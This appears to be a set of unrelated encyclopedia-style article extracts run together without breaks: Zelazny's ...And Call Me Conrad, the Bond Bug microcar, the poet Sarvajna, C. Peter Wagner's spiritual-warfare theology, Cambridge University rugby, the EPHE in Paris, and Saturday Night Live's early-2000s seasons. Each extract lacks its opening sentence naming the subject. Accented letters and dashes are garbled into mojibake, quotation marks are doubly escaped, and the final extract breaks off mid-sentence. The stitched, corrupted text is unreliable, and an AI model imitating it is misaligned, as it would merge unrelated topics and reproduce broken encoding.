In its original publication, it was abridged by the editor and published in two parts in The Magazine of Fantasy and Science Fiction in October and November 1965. It tied with Frank Herbert's Dune for the 1966 Hugo Award for Best Novel.  Publication history  Most, but not all of the cuts made for the serialized version were restored for the first paperback publication by Ace Books and the title was changed by the publisher to This Immortal. Zelazny stated in interviews that he preferred the original eponymous title. The abridged version was novel length at over 47,000 words; the paperback version was over 58,000 words after the cuts were restored. However, it was not until a book club version was published in the 1980s that Zelazny realized that some cuts had not been restored to the book version; thus, earlier publications of This Immortal were still not complete. The abridged magazine version also contains 10 paragraphs of text not in the book version, starting from \\"And the long-dormant Radpol was stirring again, but I did not know that until several days later\\" and ending with \\"The days of Karaghiosis had passed.\\" Also, the \\"Synopsis of Part One\\" that appeared in the November 1965 issue of F&SF; (immediately prior to Part Two) is written in the first person and contains material about Conrad's character and backstory that is not in the main text of ...And Call Me Conrad nor the 1980s restored version of This Immortal.\\"...And Call Me Roger\\": The Literary Life of Roger Zelazny, Part 1, by Christopher S. Kovacs. In: The Collected Stories of Roger Zelazny, Volume 1: Threshold, NESFA Press, 2009.  Plot summary After being devastated by a nuclear war, the Earth is a planet with a population of only 4 million, overrun by a variety of mutated lifeforms. Worse, much of the Earth is now owned by the Vegans, a race of blue-skinned aliens who see the planet as a tourist location. Conrad Nomikos, the first person narrator, is a man with a past that he would rather not talk about who has been given a task that he would rather refuse: to show an influential Vegan around the old ruins of Earth. But Conrad suddenly finds himself the reluctant protector of this alien visitor when attempts are made on the Vegan's life. Conrad knows that keeping the Vegan alive is importantbut now he must find out why. Conrad now finds himself pitted against a group of Earth rebels that includes an old comrade- in-arms and an old lover, neither of whom can understand why he would want to protect one of Earth's subjugators. He is aided by another old friend and an old man who is actually one of his sons. It is eventually revealed that the Vegan he is escorting has been charged with the final disposition of the planet Earth. The Vegan in his turn is confounded by Conrad's actions. Ostensibly there as a tourist to see Earth's sights, he is horrified to find that Conrad is having the pyramids of Egypt torn down, more so when the immortal explains that the process is being filmed, and that the film will be run backwards to simulate the construction of the pyramids. Along the way it appears that Conrad's beloved wife is killed in a natural cataclysm. At the end, the rebels realize that Conrad has been fighting to protect the Earth in his own way. Through actions such as the deconstruction of the pyramids, Conrad makes the Vegans see that Earthlings would rather destroy the planet's riches than see them fall into the hands of others. In the final battle to protect the Vegan, Conrad's wife appears to deliver the decisive saving blow. The Vegan sees the mettle of which Conrad is made, and decides to leave the planet in the possession of the one being with the longevity, power and moral fiber to do well by it. Conrad finds himself the owner of Earth. Major themes  Many of Zelazny's heroes are overmen, or even gods or demigods; Conrad Nomikos is no exception to the rule. Identified early in the book as a possible \\"Kallikantzaros\\"Also spelled \\"Callicantzaros\\": a legendary Greek creature somewhat similar to a vampire by his lover Cassandra (who exhibits the same abilities as her namesake to foretell the future but not be believed), Conrad is later also compared to Pan. Whether or not Conrad is a god, however, is left unclear in the book: while he has led an extraordinarily long life, it is hinted that this could be the result of mutation due to the nuclear war. Jane Lindskold, in her book titled Roger Zelazny, suggests that the fact that Conrad's face is handsome on one side and disfigured on the other is a metaphor for Conrad's ability to be both creator and destroyer, and it is not until the end of the book that the broken god can be \\"healed.\\" Zelazny declared that ‚ÄúI wanted to leave it open to several interpretations‚Äîwell, at least two. I wanted to sort of combine fantasy and sf‚Ä¶ either Conrad is a mutant or he is the Great God Pan. The book may be read either way.‚ÄùA Word from Zelazny: \\"...And Call Me Conrad, Part One.\\" In: The Collected Stories of Roger Zelazny, Volume 2: Power & Light, NESFA Press, 2009. In keeping with this, some of the clues that Conrad may be Pan are that Conrad's surname Nomikos recalls Nomios (one of Pan's titles), he plays a syrinx (panpipes) in the novel, he may be immortal, and he has a disfigured appearance (limp, scarred face, and heterochromia). Conrad Nomikos is a prototype for later Zelazny rogues such as Corwin, the amnesiac hero from The Chronicles of Amber and the cigarette-smoking Buddha, Sam (aka Mahasamatman) in Lord of Light ‚Äî both flawed humans who are also flawed superhumans. Zelazny also identified Aldous Huxley as one model he kept in mind while writing this novel: \\"Bear [Huxley] in mind when constructing the cast of characters, including the monomaniac scientist as a note of thanks for the assist, but take nothing else. Do not lean too heavily on anyone.\\" Reception Algis Budrys praised This Immortal as \\"an extremely interesting and undeniably important book\\", describing it as \\"a story of adventures and perils, high intrigue, esthetics [and] politics ... utterly charming [and] optimistic\\". He predicted that as examples of the New Wave, Zelazny's career would become more important and enduring than Thomas M. Disch's. Lawrence P. Ashmead, an editor for Doubleday & Company Inc, rejected the book for publishing, claiming that \\"the plot is terribly thin and uninteresting.\\" He also pans the \\"Germanic constructions and pseudo-clever dialogue\\" of the book.Ashmead, Lawrence P.

It is a wedge-shaped microcar, with a lift-up canopy and side screens instead of conventional doors. History =Early beginnings= Since 1962, when Reliant Motor Company launched the Regal 3/25, the company had tried to make a more sporty version to appeal to a younger buyer. Design sketches were done as early as 1964 by Ogle; these sketches are much more wedged shaped with some rounded edges; the original name for this car was the Reliant Rogue. The car was never put into production, as management thought that such a strange-looking vehicle might hurt the Reliant brand identity. =Bond cars buy out= Following the purchase of Bond Cars Ltd. in 1969, Reliant commissioned Tom Karen of Ogle Design to alter the Reliant Rogue design; the car would now become a Bond vehicle. The Bond Bug was based on chief engineer John Crosthwaite's newly designed chassis,Autocar magazine 4 June 1970 (Bond Bug)Hot VWs and Dune Buggies magazine November 1970 (Bond Bug review) and used a mixture of Reliant Regal parts, and running gear which had been designed for the Reliant Robin 750, which was due to be launched in 1974. The original concept was explored by chopping down a production Regal vehicle, the rear of the car being shortened to end over the rear axle. The engine is the front-mounted 700 cc Reliant light-alloy four- cylinder unit, later uprated to 750 cc. At launch, was claimed for the less expensive 700 and 700E models. The more upmarket 700ES incorporates a redesigned cylinder head, which permitted the compression ratio to be increased from 7.35:1 to 8.4:1. This provided a power increase to as well as improved torque for the then range-topping 700ES. The Bond Bug 700ES also offers more ergonomic seats, as well as more padding over the engine cowl, twin mudflaps, an ashtray, a rubber front bumper and a spare wheel. =Launch and production run= The car had an upbeat launch, at which Reliant's Ray Wiggin stated: \\"The fact it has three wheels is quite incidental. It's a new form of transport. So now, in fact, we think it's going to appeal to a much wider section of the market than we originally envisaged.\\" bright orange tangerine colour on exterior The Bug was available in a bright orange tangerine colour, although six white Bugs were produced for a Rothmans cigarette promotion ‚Äì one of which was also used in an advertisement for Cape Fruit. Only three Rothmans Bugs are known to exist. The car's fame was helped by a distinctive Corgi Toys die-cast toy car. Although it had a fairly short production run (1970‚Äì74), it has a dedicated following today. In contrast to the image of three-wheeled Reliants as being slow, the Bond Bug was capable of 76 mph (122 km/h), in excess of the UK national speed limit (70 mph/112.6 km/h), and comparable to small saloon cars such as the basic 850 cc Mini (72 mph/116 km/h) and the Hillman Imp (80 mph/128 km/h). However, it could not match the speed of the Mini Cooper S (96 mph/154 km/h) or larger saloons such as the Ford Cortina Mark III (104 mph/167 km/h in the highest-powered variant), or even aging models of two-seater sports cars, such as the MG MGB (103 mph/165.7 km/h) or the Lotus Seven, where by 1970 even the lowest-powered version of the S4 could reach 108 mph/173.8 km/h. The Bond Bug was sold as being fun to drive, with the low seating position giving a similar exaggerated impression of speed as in a go-kart, while the actual speed was similar to that reached by high performance cars only a few years earlier (indeed, earlier versions of the Lotus 7 had a top speed of 76 mph/122 km/h right up until 1968, and their trim level, e.g. side curtains instead of windows, was also similar). The Bug was, however, no cheaper than more practical cars. It cost ¬£629, while a basic 850 cc Mini, a four-seater much faster round corners but with considerably inferior acceleration, cost ¬£620. Also, while a basic Lotus Seven (with much faster acceleration and good cornering) cost ¬£945 in 1970, it was also available as a complete knocked down kit much more cheaply, partly because of more favourable tax treatment. Reliant launched the Bond Bug 750 in late 1973 but production ended after less than 200 Bug 750s sold, as Reliant ended all other production lines so more capacity could be made open to build more of the newly launched Reliant Robin 750 to keep up with demand. =Further development= Even though the Bond Bug ended production with little fanfare, Reliant continued development into the 1970s; prototype 4-wheeled Bond Bugs were made before the launch of the Reliant Kitten, as they thought a 4 wheeled version may have more appeal to the market. The code name FW9 was used for the 4-wheeled Bond Bug design studies, later leading to a prototype of a strange coupe that looked very different to the Bond Bug. All this design was done by Ogle, but Reliant management never took it any further. A larger engine was also in development with BRM for the car too; this was a standard 850cc engine block with a overhead camshaft design; this engine would also gain twin SU carburettors and an electric fuel pump; the engine in standard tune would give 70hp. The engine was meant to be shared with a small production sports car that Reliant never finished developing. =Webster Bug= Mike and Gary Webster between them managed to acquire the original Bug moulds from Reliant Motor Company in 1990 with a licence for the design, and formed the \\"Webster Motor Company\\". They decided to produce 4 wheeled Bugs as a \\"Kit car\\", so you would build the vehicle yourself. The kit asked you to buy a Reliant Robin or Rialto for the majority of donor parts, or the whole car could be supplied as one kit with a mixture of new and refurbished parts. To allow the Bug to have 4 wheels, the ladder chassis was cut down at the front, with a Mini front subframe welded in place. The moulds were also changed to have two large arches at the front. Different models were developed, including convertible versions that had no lift up canopy with small screens, or a standard car which had fibreglass doors instead of the original vinyl doors, to keep the driver warm and dry. Under 30 kits were known to be sold. =Reliant Sprint= In 1994 Reliant unveiled the \\"Reliant Sprint\\"; this car was a complete redesign of the original Bond Bug. Tom Karen of Ogle design rounded off all the sharp edges of the Bug and added round headlights giving the car a totally new look; the prototype had Minilite alloy wheels, a grey vinyl interior, and was bright yellow. The Sprint used, in effect, a Reliant Robin chassis cut in half, with the rear half made to use the original suspension set up of the Bond Bug. Similarly, the interior used many of the current Robin switches and dials, to keep production costs low. As shown in the \\"Trouble At The Top\\" TV show, Reliant Management wouldn't allow Jonathan Haynes to put the Sprint into production, as they had little faith that, in the 1990s, it would sell in any large numbers, even though it would cost as little as ¬£12,500 to start production. More developments were made on the Sprint until 1998, when Reliant would try to get it production-ready as a 4-wheeled sports car. Andy Plumb would redesign the car, now renamed/code named internally \\"the Clubman\\", in 2 different 4-wheeled models: a standard car and a convertible. These cars had huge bubble-shaped front and rear arches. Again more prototypes were produced; the chassis was redesigned once more with double-wishbone front suspension, and because the car was a 4-wheeler, the 850cc engine was redesigned to take fuel injection and a catalytic converter. Even though prototypes were promising, Reliant Motor Company wouldn't pay for further development, and the project died. Popular culture Tom Karen oversaw the design and production of Luke Skywalker's landspeeder from Star Wars (1977): one of the models was built upon the chassis of a Bond Bug ‚Äì the wheels hidden by mirrors angled at 45¬∞ to the ground. The Wheeler Dealers television programme purchased and restored a Bond Bug 700ES and, after completion, sold it on to make a profit. Since then, the Bug has been on display at the 2011 NEC Classic Car Show in Birmingham, where Wheeler Dealers presenters Mike Brewer, Edd China and mechanic/technical assistant Paul Brackley were reunited and signed the Bug. A Bond Bug was featured in some of the earlier episodes of Hollyoaks as a vehicle belonging to Jambo Bolton. The car has also appeared in the video for the Robbie Williams song \\"Millennium\\", and in the 118 118 advertisements. In series 2 of the television programme The Grand Tour, presenters Richard Hammond and James May go on to build an amphibious vehicle by combining a Bond Bug with the engine of a personal water craft, nicknaming it the \\"Pond Bug\\". Competing on Coniston Water during Coniston Power Boat Records Week, the third presenter, Jeremy Clarkson, operates the \\"Pond Bug\\" and achieves an average of 47.81 mph (76.94 km/h), setting a new UK speed record for an amphibious car on water.

The word \\"Sarvajna\\" in Sanskrit literally means \\"the all knowing\\". He is famous for his pithy three-lined poems called tripadi (written in the native three-line verse metre, \\"with three padas, a form of Vachana\\"). He is also referred as Sarvagna in modern translation. Early life The period of Sarvaj√±a's life has not been determined accurately, and very little is known about his personal life. Based on studies of his literary style and the references by later writers, historians estimate that he may have lived during the first half of the 16th century. Some references in his works indicate that his real name was Pushpadatta - Sarvaj√±a appears to have been his pseudonym. From information gleaned from his poems, historians believe that his father, a Veerashaiva-Lingayat, met his mother, named Mali in present-day Haveri district (formerly part of Dharwad district) of Karnataka state on his way to Benares while on a pilgrimage. Sarvajna upheld the wisdom of pastoral life in rural areas in his poems and tried to persuade villagers to give up superstition, meaningless customs and traditions. Tripadis Sarvagna grew up as a wandering monk creating Tripadis, the famous three liners. In all, about 2000 three-liners are attributed to him. Popular because of their alliterative structure and simplicity, they deal mainly with social, ethical and religious issues. A number of riddles are also attributed to Sarvajna.

In his earlier years Wagner was known as a key leader of the Church Growth Movement and later for his writings on spiritual warfare.http://www.christianitytoday.com/edstetzer/2016/october/in-memory-of- c-peter-wagner.html Wagner served as a missionary in Bolivia under the South American Mission and Andes Evangelical Mission (now SIM International) from 1956 to 1971. He then served for 30 years (1971 to 2001) as Professor of Church Growth at the Fuller Theological Seminary's School of World Missions until his retirement in 2001. He authored 80 books. He was the founding president of Global Harvest Ministries from 1993 to 2011 and founder and chancellor emeritus of Wagner Leadership Institute (now Wagner University), which trains revivalists and reformers to bring about a global movement of transformation. He also founded Reformation Prayer Network, International Coalition of Apostles, Eagles Vision Apostolic Team, and the Hamilton Group and served as vice president of Global Spheres, Inc. Spiritual warfare Wagner wrote about spiritual warfare, in books including Confronting the Powers: How the New Testament Church Experienced the Power of Strategic-Level Spiritual Warfare and Engaging the Enemy. In Confronting the Powers, Wagner breaks down spiritual warfare as having three levels: \\"Ground Level: Person- to-person, praying for each other's personal needs. Occult Level: deals with demonic forces released through activities related to Satanism, witchcraft, astrology and many other forms of structured occultism. Strategic-Level or Cosmic-Level: To bind and bring down spiritual principalities and powers that rule over governments.\\"C. Peter Wagner. Confronting the Powers: How the New Testament Church Experienced the Power of Strategic-level Spiritual Warfare. Regal Books; 1996. .pp.21-22 \\"Strategic-level intercession\\" uses \\"spiritual mapping\\" and \\"tearing down strongholds\\" to engage in spiritual warfare against \\"territorial spirits\\".Confronting the Powers According to Wagner, these methods \\"were virtually unknown to the majority of Christians before the 1990s‚Äù.Confronting the Powers, p21 The premise of Engaging the Enemy is that Satan and his demons are literally in the world, that Satan's territorial spirit-demons may be identified by name, and that Christians are to engage in spiritual warfare with them.C. Peter Wagner, Engaging the Enemy Wagner preached a fivefold ministry view based on Ephesians 4:13, in which apostles, prophets, evangelists, pastors, and teachers are considered legitimate offices of the church. While mainline Protestant denominations see prophets and apostles as dispensed of within the early period of Christianity, Wagner's spiritual-warfare theology depicted these figures as prayer-warriors actively interceding in the contemporary world. These prayer warriors are responsible for ushering in the return of Jesus and the Kingdom of God through warfare prayer. In Hard-Core Idolatry: Facing the Facts, Wagner asserted that idolizing Catholic saints brings honor to the spirits of darkness, and promotes the burning of their statues in Argentina. Wagner asserted that the Holy Spirit came to his associate, Cindy Jacobs (a prophet in Wagner's Apostolic Council of Prophetic Elders) and \\"told her that in [the Argentinian city of] Resistencia they need to burn the idols, like the magicians did in Ephesus in Acts of the Apostles\\".Hard-Core Idolatry ‚Äì Facing the Facts, pp 38-40, 1999, publisher - Wagner Institute of Practical Ministry  New Apostolic Reformation  Wagner used the term New Apostolic Reformation (NAR) to describe what he observed as a movement within Pentecostal and charismatic churches. The title is not an organization and does not have formal membership. Wagner stated, \\"The roots of the NAR go back to the beginning of the African Independent Church Movement in 1900, the Chinese House Church Movement beginning in 1976, the U.S. Independent Charismatic Movement beginning in the 1970s and the Latin American Grassroots Church Movement beginning around the same time. I was neither the founder nor a member of any of these movements, I was simply a professor who observed that they were the fastest growing churches in their respective regions and that they had a number of common characteristics.\\" Dr. Roger Olson writes, ‚Äú‚Ä¶the closer I looked at the NARM [New Apostolic Reformation Movement] the less convinced I was that it is a cohesive movement at all. It seems more like a kind of umbrella term for a loose collection of independent ministries that have a few common interests...I have examined the web sites of several independent evangelists who claim to represent that affinity...So far none of them seem blatantly heretical. Eccentric, non-mainline, a bit fanatical, maybe.‚Äù Another term coined by Wagner is the Third Wave of the Holy Spirit. The NAR includes key elements of the Third Wave such as claims of miraculous healing. Wagner provided the key differences between the NAR and traditional Protestantism in his article The New Apostolic Reformation Is Not a Cult. He noted that those participating in the movement believe the Apostles‚Äô Creed and adhere to orthodox Christian doctrine.  Seven Mountains Dominionism  In his 1998 book Churchquake!, Wagner denied that NAR had any political orientation. Ten years later he published Dominion!, an endorsement of Dominion Theology.

The team plays Oxford University RFC in the annual Varsity Match at Twickenham Stadium every December. Cambridge players wear light blue and white hooped jerseys with a red lion crest. Many have gone on to represent their country and the British and Irish Lions; a few, most notably Dan Vickerman, James Horwill & Flip van der Merwe, have represented Cambridge after successful international careers. While at Cambridge University James Bevan became the first captain of the Wales national rugby union team. The CURUFC stadium is located in West Cambridge, beside Grange Road.  History  Cambridge University team in 1890 Football is believed to have been introduced to Cambridge University in 1839 by Trinity College fresher Albert Pell.Marshall (1951), pg 13. Pell had matriculated at Cambridge after going up from Rugby School, where the game of rugby is believed to have originated. Cambridge University Rugby Union Football Club was officially established in 1872, around three years after the Oxford rugby club was founded. The first Varsity match was contested between the two teams on 10 February 1872.Marshall (1951), pg 17. The Cambridge team was led out by captain Isaac Cowley Lambert, wearing pink jerseys with a monogram on the left breast. Played away at the Park in Oxford, Cambridge lost by a single goal to nil. CURUFC officials helped to draw up the laws of the game that were adopted by the Rugby Football Union (RFU) when it was established in 1871. Cambridge became a Constituent Body of the Union in 1872, a status which the club still holds today. In 1874, Cambridge provided their first international player directly from the club, when John Batten represented England in the third encounter against Scotland. Facilities =Ground= Cambridge rugby ground The CURUFC Stadium and Training Grounds are located in West Cambridge, close to Selwyn College's Cripps Court and St Catherine's College's St Chad building. The historic stadium features a number of buildings dating to the early 19th and 20th centuries. A large red lion, a symbol of the University of Cambridge, stands guard beside the stadium. The facilities are partially maintained by Cantab Asset Management. The stadium, built in the 19th century, is undersized and is often over capacity during matches, leading to calls for an expansion and redevelopment project. In addition to the Grange Road Site, the club practices on various college and university fields around Cambridge and Grantchester. =Redevelopment Project= In 2015, plans were drafted for a large redevelopment of the Grange Road Site which would ensure the team remains competitive over the next 50 years. The plans included expanded seating, high-tech training facilities, and a new walled admission entrance on Grange Road. An architect for the project has yet to be chosen. In Michaelmas 2017, the CURUFC launched its first fundraising campaign for the Grange Road Redevelopment Project.

It is highly selective, and counted among France's most prestigious research and higher education institutions. It is a constituent college of the elite Universit√© PSL (together with ENS Ulm, Paris Dauphine or Ecole des Mines). Its degrees in religious studies and in history count among the best in the world. Closely linked to √âcole fran√ßaise d'Extr√™me-Orient and Institut fran√ßais du Proche-Orient, EPHE has formed continuously world-class experts in Asian and Islamic studies and among them investment bankers, diplomat and military officers specialized in these areas. Particularly, leading researchers in military strategy have taught in EPHE for more than a century (for example, Herv√© Coutau-B√©garie). Moreover, famous researchers in natural sciences (especially neurosciences and chemistry) teach and taught in EPHE (among them Jean Baptiste Charcot and Marcellin Berthelot). Highly regarded for its top level in both natural and human sciences, EPHE has relations and exchange programs with world-renowned institutions such as Cambridge, Princeton, and Al-Azhar.  Overview  The EPHE brings together 240 faculty members and about 3,000 students/attenders into three core departments called ‚ÄúSections‚Äù : Earth and Life Sciences, Historical and Philological Sciences, and Religious Sciences. In all Sections, tutoring and immediate induction in research practice are at the core of teaching in the different degree programs. It is one of the only place in the world where so many ancient and rare oriental languages are taught. It has headquarters in Paris, and is present in many locations in France. Teaching and research in human sciences are conducted in Paris, notably at the Sorbonne, the historical house of the former University of Paris and in the building of Maison des Sciences de l'Homme. In the Earth and Life Sciences Section, the work takes place at the EPHE's many laboratories (Paris and its region, Nancy, Dijon, Lyon, Grenoble, Montpellier, Perpignan, Toulouse, Bordeaux, Caen, Dinard, French Polynesia). EPHE is a leading place for neurosciences and A.I. related subjects. After selective entry requirements and the validation of highly specialized courses student can obtain the Master's and Doctorate degrees, and the postdoctoral Habilitation √† Diriger des Recherches. The School also offers its specific postgraduate degrees ‚Äì the ‚ÄúDipl√¥me EPHE‚Äù and the ‚ÄúDipl√¥me post- doctoral‚Äù ‚Äì as well as joint degrees with other universities. The EPHE maintains extensive cooperative exchanges with universities and research institutions. Priority areas of cooperation are in Europe, the Mediterranean, Middle-East and Asia.

Its purpose was to introduce research in academia and, more importantly, to promote academic training through research. It was intended to promote a practical form of scholarship designed to produce knowledge and to be taught in seminars and laboratories, as was being practiced in Germany at the time. Faculty members were to be dedicated, available to students and others for collaboration, accessible, and advance a form of education dependent on a framework of a direct relationship between the master and his disciple. The School originally had four Sections: first established were Mathematics, Physics, and Chemistry; Natural Sciences and Physiology; Philological and Historical Sciences. The Economics Section followed in 1869, but was not developed. The Religious Sciences Section was added in 1886. Section VI, called Economic and Social Sciences, was founded after the Second World War. This section included the study of anthropology, and the French made substantial contributions to these fields, particularly in the structuralism of Claude L√©vi-Strauss and others. Their scholars were doing research in South America, Africa and Southeast Asia. There was also research in ethnopsychoanalysis and ethnopsychiatry, particularly by Georges Devereux, who joined the Section in 1963 and influenced more than a generation of scholars.\\"Devereux, Georges\\", in: G√©rald Gaillard, The Routledge Dictionary of Anthropologists, Psychology Press, 2004, pp. 181 and 292, accessed 21 August 2014 In 1975 Section VI was separated to establish a new school, the √âcole des hautes √©tudes en sciences sociales (EHESS). The institution has been reorganized into three Sections: Earth and Life Sciences, Historical and Philological Sciences, Religious Sciences. Many renowned scholars have lectured at the EPHE or worked in its laboratories.More authors may be found on the digitized collection of the Annuaire publication (Historical and Philological Sciences Section and Religious Sciences Section) on Persee portal We may cite the following: √âmile Benveniste (1928-1975), Fernand Braudel (1938-1953), Claude Bernard, Andr√© Berthelot (Vice-President), Marcellin Berthelot, Michel Br√©al (1893-1913), Paul Broca, Jean-Baptiste Charcot, Henry Corbin (1938-1977), Georges Dum√©zil (1933-1967), Lucien Febvre (1943-1947), √âtienne Gilson (1930-1941), Marcel Granet (1930-1939), Joseph Hal√©vy (1887-1916), Bernard Halpern, Alexandre Koj√®ve (1933-1939), Alexandre Koyr√© (1931-1961), Camille-Ernest Labrousse (1936-1952), Claude L√©vi-Strauss (1950-1967), Sylvain L√©vi, Alfred Loisy, Auguste Longnon (1887-1911), Gaston Maspero (1872-1915), Louis Massignon (1932-1957), Marcel Mauss (1930-1938), Gabriel Monod (1887-1911), Gaston Paris (1887-1904), Lucie Randoin, Jean Rouch (1959-1992), √âmile Roux, Ferdinand de Saussure, Rolf Stein, William Henry Waddington, Henri Wallon...  Recent developments  Since 2006, the EPHE has been setting up specialized centers which draw on the same scientific resources of the Sections, but whose primary purpose is to develop disciplinary expertise and vocational training, and to disseminate scholarly knowledge. Three institutes have been established to date : The European Institute of Religious Sciences (IESR), the Pacific Coral Reef Institute (IRCP) and the Transdisciplinary Institute for the Study of Aging (ITEV). More recently the EPHE has undertaken, as one of nine project sponsors, to create a new research campus in the human and social sciences, the ‚ÄúCampus Condorcet‚Äù. Finally, the school has joined PSL, Paris Sciences et Lettres in December 2014.  Training  Courses at the EPHE are taught in accordance with the institution's founding educational principle: to train in research by means of adapted practice in lectures, seminars or lab sessions, in the following areas: Earth and Life Sciences; Historical and Philological Sciences; Religious Sciences. This tradition, which has endured since the founding of the EPHE, is at the root of the EPHE's main vocation in preparing for research degrees today. = Studies programs =Two institution-specific postgraduate degrees (in each of the three Sections): ‚ÄúDipl√¥me de l‚ÄôEPHE‚Äù, ‚ÄúDipl√¥me post- doctoral de l‚ÄôEPHE‚Äù; *Two master's degrees: The Master in Biology, Health, Environment (research degree, 3 specialties), The Master in Historical, Philological and Religious Sciences (Religious Sciences and Society, European, Mediterranean and Asian Sciences); *The Doctorate, in three subjects areas prepared at the same Doctoral School: Integrated Systems, Biodiversity and Environment (‚ÄúSIEB‚Äù), History, Documents and Texts (‚ÄúHTD‚Äù), Religions and Thought Systems (‚ÄúRSP‚Äù). The EPHE also confers the Habilitation √† diriger des recherches (HDR) and offers joint university degrees (‚ÄúDIU‚Äù) in collaboration with other institutions. = Earth and Life Sciences = The Earth and Life Sciences Section groups faculty and laboratories in Paris and throughout France. All laboratories have joint research units in place with other institutions (universities, CNRS, INSERM, INRIA, MNHN). One laboratory is in French Polynesia on the island of Moorea, where the EPHE has a research station. The School also has a station in coastal geomorphology in Dinard on the coast of Brittany. The Section's research is carried out within four networks: environment and cellular regulation; neurosciences; environment and Society; biodiversity dynamics. = Historical and Philological Sciences = The Historical and Philological Sciences Section covers the study of languages, the explanation and commentary of documentary sources, written and book history, and the history of knowledge. Geographically, the emphasis is on the Mediterranean, Asia and Europe, where writing was earliest developed. It remains a field of choice for philological and, more generally, scholarly criticism of written and unwritten sources, aimed at resolving questions of language and history. The Section may also be regarded as one large laboratory devoted to the study of works, cultures and power systems in periods preceding contemporary times, and reaching back over a very long time span within a vast Eurasian area. In 2010, the Section included 92 full professors and lecturers, and it welcomes every year a large number of foreign scholars as guest fellows. Topics covered by the Historical and Philological Sciences Section fall into eight broad categories:More topics may be found on the Annuaire of the Historical and Philological Sciences Section *Ancient Near and Middle East; *Classical Antiquity; *Muslim worlds; *History and Philology of Medieval Period; *Modern and contemporary History of the West; *India and the Far East; *History of the Arts and Archeology; *Linguistics. Historical and Philological Sciences Publications : The Historical and Philological Sciences Section publishes two collections at Editions Honor√© Champion: * Biblioth√®que de l‚Äô√âcole des hautes √©tudes, Historical and Philological Sciences; * Advanced studies in contemporary history). It also publishes six other collections at the publisher Droz Publisher: *Advanced studies in numismatics; *Advanced oriental studies, divided in two series : Near and Middle East, Far East; *Advanced studies of the Greco-Roman world; *Advanced studies in comparative Islamic and oriental history; *Advanced studies of medieval and modern times; *History and civilization of the book. = Religious Sciences = Established in 1886, the Religious Sciences Section is reputed for its original scholarship in the subject of religions, which it examines in a secular and cross-cultural spirit. By emphasizing comparative and interdisciplinary study, it is the only academic body in France to cover this field so extensively, using a wide range of scientific approaches. The Section's teaching in the area of research extends into the most diverse cultural and linguistic fields, from Antiquity to modern and contemporary times. Strongly committed to the philological tradition, it also naturally draws on disciplines or resources as diverse and complementary as history, archeology, iconology, law, philosophy, ethnology, anthropology and sociology, as well as the cinema and new technologies.

The show has aired on NBC since 1975. These years saw many cast changes, most prominently Will Ferrell's exit in 2002 and Jimmy Fallon's exit in 2004. Cast members hired during this period that would later have a huge impact on the show include Fred Armisen and Amy Poehler. Quality period (2000‚Äì2001) The 2000‚Äì01 season marked the beginning of yet another transitional phase. While veterans such as Chris Kattan and Will Ferrell still dominated the show, more time was being given to newer cast members such as Horatio Sanz and Jimmy Fallon (whose prodigious ability at impressions would be increasingly utilized). Both men were also criticized for regularly and self-consciously breaking character during many sketches. Long-time cast member Molly Shannon left the cast at mid-season. This was also Jerry Minor's only season. In 1999, Tina Fey became the show's first female head writer. With Colin Quinn's \\"Weekend Update\\" tenure over, Lorne Michaels teamed Fey with Jimmy Fallon this season, the first duo to anchor the segment since Christine Ebersole and Brian Doyle-Murray in the early 1980s. This pairing was well received by critics. Fey appeared occasionally as an extra before being hired as a cast member. Fey was a featured player during her first season and was then promoted to contract player, while still maintaining her position as head writer. Chris Parnell was fired at the end of this season, only to be rehired during the next season. He was eventually fired a second time at the end of the 2005‚Äì06 season, this time for good. =2000 presidential election= The 2000‚Äì01 season was also noted for its well-received spoofing of that year's presidential campaign, with adroit critiques of all the primary nominees, but especially Al Gore and George W. Bush. The two candidates even appeared (separately) on a special with the cast in fall 2000. Will Ferrell's Bush impression coined the term \\"strategery\\" in a sketch mocking Bush's propensity for mispronunciations, while Darrell Hammond's Gore was complemented by his slow, deliberate drawl and use of the term \\"lockbox\\" during the show's debate sketches. In April 2015, Ferrell stated that he thought his impression \\"humanised\\" Bush to the country and may have won him the election, and that Hammond's \\"rigid, robotic- like\\" take on Gore may have influenced the result also. =Opening sequence= This opening montage was used for three seasons. It contains various shots from around New York City and features the cast members in a nightclub. It was also the first opening montage since the 1993‚Äì94 season in which the cast members moved on-screen. The music that would accompany the opening credits for this season and the next two would garner some criticism from some SNL \\"purists\\" because of its heavy use of turntables and DJ equipment. =Cast=Jimmy Fallon *Will Ferrell *Ana Gasteyer *Darrell Hammond *Chris Kattan *Tracy Morgan *Chris Parnell *Horatio Sanz *Molly Shannon (final episode: February 17, 2001) Featuring *Rachel Dratch *Tina Fey *Jerry Minor *Maya Rudolph bold denotes \\"Weekend Update\\" anchor Post 9/11 (2001‚Äì2002) The 2001‚Äì02 season could be called more \\"stable\\" than the previous season. Rachel Dratch, Tina Fey, and Maya Rudolph were all upgraded to contract status for this season. Ana Gasteyer went on maternity leave at the end of the season. After her daughter was born, she decided not to return to the show. Amy Poehler was upgraded to contract status quickly after being hired this season. Featured player Jeff Richards became the first former Mad TV cast member to join SNL. The 2001‚Äì02 season was the last to feature Will Ferrell as a cast member. After seven seasons, Ferrell left the show after recently becoming the highest paid cast member in SNL's history. The last segment of the season finale featured an homage to Ferrell by the rest of the cast reflecting on what he brought to the show; it remains one of the only full-fledged farewells to a cast member in SNL history. He and Darrell Hammond shared the honour of longest-serving cast members during this season. =Fallout from the 9/11 terrorist attacks= The first-season premiere after the September 11 attacks (hosted by Reese Witherspoon) opened with then-New York City mayor Rudolph Giuliani and firefighters, as well as a performance of \\"The Boxer\\" by Paul Simon. The mayor said that \\"Having our city‚Äôs institutions up and running sends a message that New York City is open for business.\\" It signified that the New York-based series was deeply affected by the terrorist attack. Witherspoon later stated that she thought she \\"did an incredible job getting that show back on its feet and making America laugh again\\". As a result, the political commentary was scaled back. As time passed, the show gave more attention to political humor, but earlier attempts were seen by critics as tame, evidence that the show had, over the decades, gone from counterculture to safe and mainstream. Robert Smigel's cartoons, however, retained their bite and became heavily featured on the show. =Opening montage= This opening montage was the same as the 2000‚Äì01 season's, save for cast changes, and this time without the World Trade Center in the skyline shot. Ana Gasteyer's clip was changed. The theme had a minor change also. =Cast=Rachel Dratch *Jimmy Fallon *Will Ferrell *Tina Fey *Ana Gasteyer *Darrell Hammond *Chris Kattan *Tracy Morgan *Chris Parnell (first episode back: March 2, 2002) *Amy Poehler (upgraded to repertory status: January 12, 2002) *Maya Rudolph *Horatio Sanz Featuring *Dean Edwards *Seth Meyers *Jeff Richards bold denotes \\"Weekend Update\\" anchor More cast changes (2002‚Äì2003) The 2002‚Äì03 season would see more cast turnover, with Fred Armisen and Will Forte joining the cast and Chris Kattan and Tracy Morgan both opting to leave 